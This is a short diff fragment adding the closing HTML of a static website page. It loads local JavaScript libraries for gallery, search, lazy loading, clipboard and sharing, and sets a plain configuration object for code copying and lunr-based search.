+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
